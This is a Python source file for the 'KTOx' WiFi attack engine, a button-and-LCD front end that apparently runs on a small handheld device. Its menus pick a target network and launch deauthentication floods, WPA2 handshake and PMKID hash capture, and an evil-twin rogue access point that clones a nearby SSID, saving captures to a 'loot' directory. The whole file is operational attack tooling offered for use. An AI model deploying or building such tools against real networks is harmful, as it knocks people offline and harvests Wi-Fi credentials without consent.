#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# hw/ktox_hw_wifi.py — KTOx WiFi Engine (Hardware GUI)
#
# Wraps ktox_wifi.py with RaspyJack LCD/GPIO interface:
#   Monitor Mode · WiFi Scanner · Deauth Attack
#   Handshake Capture · PMKID Attack · Evil Twin AP
#
# Controls: UP/DOWN scroll · OK select · KEY3 back/stop

import sys, os, time, signal, threading

_HW_DIR = os.path.dirname(os.path.abspath(__file__))
_ROOT   = os.path.dirname(_HW_DIR)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from ktox_hw_utils import (
    hw_init, hw_cleanup, push,
    clear_buf, draw_header, draw_status, draw_menu, draw_centered,
    draw_running, draw_result,
    read_btn, wait_for_btn,
    install_signal_handlers, make_logger, loot_dir,
    C, FONT_TITLE, FONT_MENU, FONT_SMALL, LCD_W, LCD_H,
)

log = make_logger("wifi")

LCD = IMAGE = DRAW = None
RUNNING = True

MENU_ITEMS = [
    "MONITOR MODE",
    "WIFI SCAN",
    "DEAUTH",
    "HANDSHAKE CAP",
    "PMKID ATTACK",
    "EVIL TWIN AP",
    "< BACK",
]
MENU_COLORS = [
    C["STEEL"], C["ASH"], C["BLOOD"],
    C["EMBER"], C["BLOOD"], C["ORANGE"], C["DIM"],
]


def cleanup(*_):
    global RUNNING
    if not RUNNING:
        return
    RUNNING = False
    hw_cleanup(LCD)
    sys.exit(0)


def _try_import_wifi():
    try:
        import ktox_wifi as w
        return w
    except Exception as e:
        log(f"import ktox_wifi failed: {e}")
        return None


def _wait_stop(stop_event, title, subtitle="", pkt_ref=None):
    pkt_ref = pkt_ref or [0]
    last_t  = 0.0
    elapsed = 0
    t_start = time.time()
    while not stop_event.is_set():
        elapsed = int(time.time() - t_start)
        clear_buf(DRAW)
        draw_running(DRAW, title, line1=subtitle,
                     pkt_count=pkt_ref[0], elapsed=elapsed)
        push(LCD, IMAGE)
        btn, last_t = read_btn(last_t)
        if btn in ("KEY3", "LEFT"):
            stop_event.set()
            break
        time.sleep(0.15)


def _get_wifi_ifaces():
    """Return list of wireless interface names."""
    ifaces = []
    try:
        for name in os.listdir("/sys/class/net/"):
            wireless = os.path.join("/sys/class/net", name, "wireless")
            phy80211 = os.path.join("/sys/class/net", name, "phy80211")
            if os.path.isdir(wireless) or os.path.isdir(phy80211):
                ifaces.append(name)
    except Exception:
        pass
    return ifaces or ["wlan0"]


def _pick_iface():
    """Let user pick a wireless interface if more than one."""
    ifaces = _get_wifi_ifaces()
    if len(ifaces) == 1:
        return ifaces[0]

    sel    = 0
    last_t = 0.0
    while True:
        clear_buf(DRAW)
        draw_header(DRAW, "WIFI IFACE", color=C["ORANGE"])
        draw_menu(DRAW, ifaces + ["< BACK"], sel,
                  item_colors=[C["WHITE"]] * len(ifaces) + [C["DIM"]])
        draw_status(DRAW, "OK:SELECT KEY3:BACK", color=C["DIM"])
        push(LCD, IMAGE)

        btn, last_t = read_btn(last_t)
        if btn == "UP":
            sel = (sel - 1) % (len(ifaces) + 1)
        elif btn == "DOWN":
            sel = (sel + 1) % (len(ifaces) + 1)
        elif btn in ("OK", "KEY_PRESS"):
            if sel == len(ifaces):
                return None
            return ifaces[sel]
        elif btn in ("KEY3", "LEFT"):
            return None
        time.sleep(0.05)


def _pick_ap(w, mon_iface):
    """Scan for APs (non-blocking scan loop) and let user pick one."""
    aps = []
    try:
        scanner  = w.WiFiScanner(mon_iface)
        scanner.start()
        t_start  = time.time()
        dots     = 0
        last_t   = 0.0
        cancelled = False
        while time.time() - t_start < 15:
            dots = (dots + 1) % 4
            clear_buf(DRAW)
            draw_header(DRAW, "SCAN APs", color=C["ORANGE"])
            draw_centered(DRAW, "scanning" + "." * dots, 38, FONT_MENU, fill=C["STEEL"])
            draw_centered(DRAW, f"{len(scanner.networks)} found", 56, FONT_SMALL, fill=C["GOOD"])
            draw_status(DRAW, "KEY3: cancel", color=C["DIM"])
            push(LCD, IMAGE)
            btn, last_t = read_btn(last_t)
            if btn in ("KEY3", "LEFT"):
                cancelled = True
                break
            time.sleep(0.5)
        scanner.stop()
        if cancelled:
            return None
        aps = list(scanner.networks.values())
    except Exception as e:
        log(f"wifi_scan error: {e}")

    if not aps:
        clear_buf(DRAW)
        draw_header(DRAW, "NO APs", color=C["BLOOD"])
        draw_centered(DRAW, "no networks found", 50, FONT_MENU, fill=C["STEEL"])
        draw_status(DRAW, "KEY3: BACK", color=C["DIM"])
        push(LCD, IMAGE)
        wait_for_btn(["KEY3", "LEFT"])
        return None

    sel    = 0
    last_t = 0.0
    while True:
        clear_buf(DRAW)
        draw_header(DRAW, "SELECT AP", color=C["ORANGE"])
        labels = []
        for ap in aps:
            ssid    = str(ap.get("ssid", "?"))[:10]
            ch      = ap.get("channel", "?")
            enc     = ap.get("enc", "?")[:4]
            labels.append(f"{ssid} [{ch}]{enc}")
        draw_menu(DRAW, labels + ["< BACK"], sel,
                  item_colors=[C["WHITE"]] * len(aps) + [C["DIM"]])
        draw_status(DRAW, "OK:SEL KEY3:BACK", color=C["DIM"])
        push(LCD, IMAGE)

        btn, last_t = read_btn(last_t)
        if btn == "UP":
            sel = (sel - 1) % (len(aps) + 1)
        elif btn == "DOWN":
            sel = (sel + 1) % (len(aps) + 1)
        elif btn in ("OK", "KEY_PRESS"):
            if sel == len(aps):
                return None
            return aps[sel]
        elif btn in ("KEY3", "LEFT"):
            return None
        time.sleep(0.05)


# ══════════════════════════════════════════════════════════════════════════════

def op_monitor_mode(w, iface):
    """Enable or disable monitor mode on selected interface."""
    clear_buf(DRAW)
    draw_header(DRAW, "MONITOR", color=C["STEEL"])
    draw_centered(DRAW, f"iface: {iface}", 30, FONT_MENU, fill=C["WHITE"])
    items  = ["ENABLE", "DISABLE", "< BACK"]
    colors = [C["GOOD"], C["BLOOD"], C["DIM"]]
    sel    = 0
    last_t = 0.0

    while True:
        clear_buf(DRAW)
        draw_header(DRAW, "MONITOR", color=C["STEEL"])
        draw_menu(DRAW, items, sel, item_colors=colors, y_start=25)
        draw_status(DRAW, "OK:SELECT KEY3:BACK", color=C["DIM"])
        push(LCD, IMAGE)

        btn, last_t = read_btn(last_t)
        if btn == "UP":
            sel = (sel - 1) % len(items)
        elif btn == "DOWN":
            sel = (sel + 1) % len(items)
        elif btn in ("OK", "KEY_PRESS"):
            if items[sel] == "< BACK":
                return
            action = items[sel]
            break
        elif btn in ("KEY3", "LEFT"):
            return
        time.sleep(0.05)

    try:
        mon = w.MonitorMode(iface=iface)
        if action == "ENABLE":
            mon_iface = mon.enable()
            log(f"MONITOR_ENABLE iface={mon_iface}")
            draw_result(DRAW, "MONITOR ON",
                        [f"iface: {mon_iface}", "ready"], color=C["GOOD"])
        else:
            mon.disable()
            log("MONITOR_DISABLE")
            draw_result(DRAW, "MONITOR OFF",
                        [f"{iface}", "restored"], color=C["GOOD"])
    except Exception as e:
        log(f"monitor error: {e}")
        draw_result(DRAW, "MON ERR", [str(e)[:20]], color=C["BLOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_wifi_scan(w, mon_iface):
    """Run a passive AP + client scan and display results."""
    aps = []
    try:
        scanner  = w.WiFiScanner(mon_iface)
        scanner.start()
        t_start  = time.time()
        dots     = 0
        last_t   = 0.0
        while time.time() - t_start < 20:
            dots = (dots + 1) % 4
            clear_buf(DRAW)
            draw_header(DRAW, "WIFI SCAN", color=C["ASH"])
            draw_centered(DRAW, "scanning" + "." * dots, 38, FONT_MENU, fill=C["STEEL"])
            draw_centered(DRAW, f"{len(scanner.networks)} APs", 56, FONT_SMALL, fill=C["GOOD"])
            draw_status(DRAW, "KEY3: stop", color=C["DIM"])
            push(LCD, IMAGE)
            btn, last_t = read_btn(last_t)
            if btn in ("KEY3", "LEFT"):
                break
            time.sleep(0.5)
        scanner.stop()
        aps = list(scanner.networks.values())
        log(f"WIFI_SCAN_DONE aps={len(aps)}")
    except Exception as e:
        log(f"wifi_scan error: {e}")

    if not aps:
        draw_result(DRAW, "NO APs", ["none found"], color=C["ORANGE"])
        push(LCD, IMAGE)
        wait_for_btn(["KEY3", "LEFT"])
        return

    # Display scrollable results
    sel    = 0
    last_t = 0.0
    while True:
        clear_buf(DRAW)
        draw_header(DRAW, f"APs ({len(aps)})", color=C["ASH"])
        labels = []
        for ap in aps:
            ssid = str(ap.get("ssid", "?"))[:10]
            ch   = ap.get("channel", "?")
            enc  = ap.get("enc", "?")[:4]
            pwr  = ap.get("power", "?")
            labels.append(f"{ssid} ch{ch} {enc} {pwr}dB")
        draw_menu(DRAW, labels, sel, item_colors=[C["WHITE"]] * len(aps))
        draw_status(DRAW, "KEY3: BACK", color=C["DIM"])
        push(LCD, IMAGE)

        btn, last_t = read_btn(last_t)
        if btn == "UP":
            sel = (sel - 1) % len(aps)
        elif btn == "DOWN":
            sel = (sel + 1) % len(aps)
        elif btn in ("KEY3", "LEFT"):
            break
        time.sleep(0.05)


def op_deauth(w, mon_iface):
    """Deauth attack — pick AP then optional client."""
    ap = _pick_ap(w, mon_iface)
    if not ap:
        return

    bssid   = ap.get("bssid", "ff:ff:ff:ff:ff:ff")
    channel = ap.get("channel", 1)

    # Offer broadcast or single-client
    options = ["BROADCAST ALL", "PICK CLIENT", "< BACK"]
    sel     = 0
    last_t  = 0.0
    client  = "ff:ff:ff:ff:ff:ff"

    while True:
        clear_buf(DRAW)
        draw_header(DRAW, "DEAUTH", color=C["BLOOD"])
        draw_menu(DRAW, options, sel,
                  item_colors=[C["BLOOD"], C["EMBER"], C["DIM"]])
        draw_status(DRAW, "OK:SELECT KEY3:BACK", color=C["DIM"])
        push(LCD, IMAGE)

        btn, last_t = read_btn(last_t)
        if btn == "UP":
            sel = (sel - 1) % len(options)
        elif btn == "DOWN":
            sel = (sel + 1) % len(options)
        elif btn in ("OK", "KEY_PRESS"):
            if options[sel] == "< BACK":
                return
            if options[sel] == "PICK CLIENT":
                clients = ap.get("clients", [])
                if clients:
                    # Simple picker
                    cs  = 0
                    lt2 = 0.0
                    while True:
                        clear_buf(DRAW)
                        draw_header(DRAW, "CLIENTS", color=C["EMBER"])
                        draw_menu(DRAW, clients + ["BROADCAST"], cs,
                                  item_colors=[C["WHITE"]] * len(clients) + [C["BLOOD"]])
                        draw_status(DRAW, "OK:SELECT KEY3:BACK", color=C["DIM"])
                        push(LCD, IMAGE)
                        btn2, lt2 = read_btn(lt2)
                        if btn2 == "UP":
                            cs = (cs - 1) % (len(clients) + 1)
                        elif btn2 == "DOWN":
                            cs = (cs + 1) % (len(clients) + 1)
                        elif btn2 in ("OK", "KEY_PRESS"):
                            if cs < len(clients):
                                client = clients[cs]
                            break
                        elif btn2 in ("KEY3", "LEFT"):
                            return
                        time.sleep(0.05)
            break
        elif btn in ("KEY3", "LEFT"):
            return
        time.sleep(0.05)

    stop = threading.Event()
    w.stop_flag.clear()
    try:
        attack = w.DeauthAttack(mon_iface, bssid, client, int(channel))
        t = threading.Thread(target=attack.attack, daemon=True)
        t.start()
        log(f"DEAUTH_START bssid={bssid} client={client}")

        last_t2 = 0.0
        elapsed = 0
        t_start = time.time()
        while not stop.is_set() and t.is_alive():
            elapsed = int(time.time() - t_start)
            sent    = getattr(attack, "sent", 0)
            clear_buf(DRAW)
            draw_running(DRAW, "DEAUTH",
                         line1=bssid[:17], pkt_count=sent, elapsed=elapsed)
            push(LCD, IMAGE)
            btn, last_t2 = read_btn(last_t2)
            if btn in ("KEY3", "LEFT"):
                stop.set()
            time.sleep(0.15)

        w.stop_flag.set()
        t.join(timeout=3)
        log("DEAUTH_STOP")
        draw_result(DRAW, "DEAUTH DONE", [bssid[:17], "stopped"], color=C["GOOD"])
    except Exception as e:
        log(f"deauth error: {e}")
        draw_result(DRAW, "DEAUTH ERR", [str(e)[:20]], color=C["BLOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_handshake(w, mon_iface):
    """WPA2 4-way EAPOL handshake capture."""
    ap = _pick_ap(w, mon_iface)
    if not ap:
        return

    bssid   = ap.get("bssid", "")
    ssid    = ap.get("ssid", "target")
    channel = ap.get("channel", 1)
    outfile = os.path.join(loot_dir(), f"handshake_{ssid[:8]}.cap")

    stop    = threading.Event()
    w.stop_flag.clear()
    try:
        cap = w.HandshakeCapture(mon_iface, bssid, ssid=ssid, channel=int(channel))
        t = threading.Thread(target=cap.capture, daemon=True)
        t.start()
        log(f"HANDSHAKE_START bssid={bssid}")

        last_t  = 0.0
        elapsed = 0
        t_start = time.time()
        captured = False
        while not stop.is_set() and t.is_alive():
            elapsed   = int(time.time() - t_start)
            captured  = getattr(cap, "_captured", False)
            frames    = len(getattr(cap, "_frames", []))
            clear_buf(DRAW)
            draw_running(DRAW, "HANDSHAKE",
                         line1=ssid[:16],
                         line2="CAPTURED!" if captured else "waiting...",
                         pkt_count=frames, elapsed=elapsed)
            push(LCD, IMAGE)
            if captured:
                time.sleep(1)
                stop.set()
                break
            btn, last_t = read_btn(last_t)
            if btn in ("KEY3", "LEFT"):
                stop.set()
            time.sleep(0.15)

        w.stop_flag.set()
        t.join(timeout=3)
        log(f"HANDSHAKE_STOP captured={captured}")
        color = C["GOOD"] if captured else C["ORANGE"]
        draw_result(DRAW, "HS CAPTURE",
                    [ssid[:16],
                     "CAPTURED!" if captured else "not captured",
                     os.path.basename(outfile)[:18]],
                    color=color)
    except Exception as e:
        log(f"handshake error: {e}")
        draw_result(DRAW, "HS ERR", [str(e)[:20]], color=C["BLOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_pmkid(w, mon_iface):
    """Clientless WPA2 PMKID hash capture."""
    ap = _pick_ap(w, mon_iface)
    if not ap:
        return

    bssid   = ap.get("bssid", "")
    ssid    = ap.get("ssid", "target")
    channel = ap.get("channel", 1)
    stop    = threading.Event()
    w.stop_flag.clear()

    try:
        attack = w.PMKIDAttack(mon_iface, bssid, channel=int(channel))
        t = threading.Thread(target=attack.attack, daemon=True)
        t.start()
        log(f"PMKID_START bssid={bssid}")

        last_t  = 0.0
        elapsed = 0
        t_start = time.time()
        captured = False
        while not stop.is_set() and t.is_alive():
            elapsed  = int(time.time() - t_start)
            captured = len(getattr(attack, "_pmkids", [])) > 0
            clear_buf(DRAW)
            draw_running(DRAW, "PMKID",
                         line1=ssid[:16],
                         line2="CAPTURED!" if captured else "assoc...",
                         elapsed=elapsed)
            push(LCD, IMAGE)
            if captured:
                time.sleep(1)
                stop.set()
                break
            btn, last_t = read_btn(last_t)
            if btn in ("KEY3", "LEFT"):
                stop.set()
            time.sleep(0.15)

        w.stop_flag.set()
        t.join(timeout=3)
        log(f"PMKID_STOP captured={captured}")
        color = C["GOOD"] if captured else C["ORANGE"]
        draw_result(DRAW, "PMKID",
                    [ssid[:16],
                     "CAPTURED!" if captured else "not captured"],
                    color=color)
    except Exception as e:
        log(f"pmkid error: {e}")
        draw_result(DRAW, "PMKID ERR", [str(e)[:20]], color=C["BLOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_evil_twin(w, iface, mon_iface):
    """Rogue AP with hostapd + dnsmasq — clones a selected nearby AP."""
    # Pick an AP to clone
    ap_info = _pick_ap(w, mon_iface)
    if not ap_info:
        return

    ssid    = ap_info.get("ssid", "FreeWiFi")
    channel = int(ap_info.get("channel", 6))

    clear_buf(DRAW)
    draw_header(DRAW, "EVIL TWIN", color=C["ORANGE"])
    draw_centered(DRAW, f"SSID: {ssid[:16]}", 30, FONT_MENU, fill=C["WHITE"])
    draw_centered(DRAW, f"CH: {channel}", 46, FONT_SMALL, fill=C["STEEL"])
    draw_centered(DRAW, "needs hostapd", 60, FONT_SMALL, fill=C["DIM"])
    draw_status(DRAW, "OK:START KEY3:BACK", color=C["DIM"])
    push(LCD, IMAGE)

    btn = wait_for_btn(["OK", "KEY_PRESS", "KEY3", "LEFT"])
    if btn in ("KEY3", "LEFT"):
        return

    stop = threading.Event()
    try:
        ap = w.EvilTwinAP(iface, ssid, channel=channel)
        t  = threading.Thread(target=ap.start, daemon=True)
        t.start()
        log("EVIL_TWIN_START")

        last_t  = 0.0
        elapsed = 0
        t_start = time.time()
        clients = 0
        while not stop.is_set():
            elapsed = int(time.time() - t_start)
            clients = getattr(ap, "client_count", 0)
            clear_buf(DRAW)
            draw_running(DRAW, "EVIL TWIN",
                         line1=f"{clients} clients", elapsed=elapsed)
            push(LCD, IMAGE)
            btn, last_t = read_btn(last_t)
            if btn in ("KEY3", "LEFT"):
                stop.set()
            time.sleep(0.15)

        ap.stop()
        t.join(timeout=5)
        log(f"EVIL_TWIN_STOP clients={clients}")
        draw_result(DRAW, "TWIN DONE",
                    [f"{clients} clients connected", "Stopped"], color=C["GOOD"])
    except Exception as e:
        log(f"evil_twin error: {e}")
        draw_result(DRAW, "TWIN ERR", [str(e)[:20]], color=C["BLOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


# ══════════════════════════════════════════════════════════════════════════════
def main():
    global LCD, IMAGE, DRAW

    w = _try_import_wifi()
    if not w:
        clear_buf(DRAW)
        draw_header(DRAW, "WIFI", color=C["BLOOD"])
        draw_centered(DRAW, "ktox_wifi", 40, FONT_MENU, fill=C["ORANGE"])
        draw_centered(DRAW, "not found", 55, FONT_SMALL, fill=C["ORANGE"])
        push(LCD, IMAGE)
        time.sleep(3)
        return

    iface = _pick_iface()
    if not iface:
        return

    sel    = 0
    last_t = 0.0

    while RUNNING:
        clear_buf(DRAW)
        draw_header(DRAW, "WIFI", color=C["ORANGE"])
        draw_menu(DRAW, MENU_ITEMS, sel, item_colors=MENU_COLORS)
        draw_status(DRAW, "OK:RUN  KEY3:BACK", color=C["DIM"])
        push(LCD, IMAGE)

        btn, last_t = read_btn(last_t)
        if btn == "UP":
            sel = (sel - 1) % len(MENU_ITEMS)
        elif btn == "DOWN":
            sel = (sel + 1) % len(MENU_ITEMS)
        elif btn in ("OK", "KEY_PRESS", "RIGHT"):
            choice = MENU_ITEMS[sel]

            if choice == "MONITOR MODE":
                op_monitor_mode(w, iface)
            elif choice == "WIFI SCAN":
                # Need monitor mode iface — try mon0 or monX
                mon_iface = iface + "mon" if not iface.endswith("mon") else iface
                op_wifi_scan(w, mon_iface)
            elif choice == "DEAUTH":
                mon_iface = iface + "mon" if not iface.endswith("mon") else iface
                op_deauth(w, mon_iface)
            elif choice == "HANDSHAKE CAP":
                mon_iface = iface + "mon" if not iface.endswith("mon") else iface
                op_handshake(w, mon_iface)
            elif choice == "PMKID ATTACK":
                mon_iface = iface + "mon" if not iface.endswith("mon") else iface
                op_pmkid(w, mon_iface)
            elif choice == "EVIL TWIN AP":
                mon_iface = iface + "mon" if not iface.endswith("mon") else iface
                op_evil_twin(w, iface, mon_iface)
            elif choice == "< BACK":
                break

        elif btn == "KEY3":
            break
        time.sleep(0.05)


if __name__ == "__main__":
    install_signal_handlers(cleanup)
    try:
        LCD, IMAGE, DRAW = hw_init()
        main()
    finally:
        cleanup()
